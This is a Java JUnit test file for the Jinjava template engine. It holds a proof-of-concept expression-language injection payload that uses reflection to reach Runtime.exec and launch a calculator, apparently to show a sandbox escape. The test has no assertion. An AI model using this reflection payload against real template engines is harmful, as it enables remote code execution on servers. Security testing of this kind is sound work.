package com.hubspot.jinjava.appsec;

import com.hubspot.jinjava.Jinjava;
import com.hubspot.jinjava.interpret.Context;
import com.hubspot.jinjava.interpret.JinjavaInterpreter;
import org.junit.Test;

import static org.assertj.core.api.Assertions.assertThat;

public class AppSecTest {
    private JinjavaInterpreter interpreter;
    private Context context;
    private Jinjava jinjava;
    @Test
    public void itDefersSimpleExpressions() {
        jinjava = new Jinjava();
        interpreter = jinjava.newInterpreter();
        context = interpreter.getContext();

        context.put("obj","");
        String poc ="''.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",''.getClass()).invoke(''.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),'/usr/bin/gnome-calculator')";
        Object a = interpreter.resolveELExpression(poc, -1);
        System.out.println(a);
    }
}
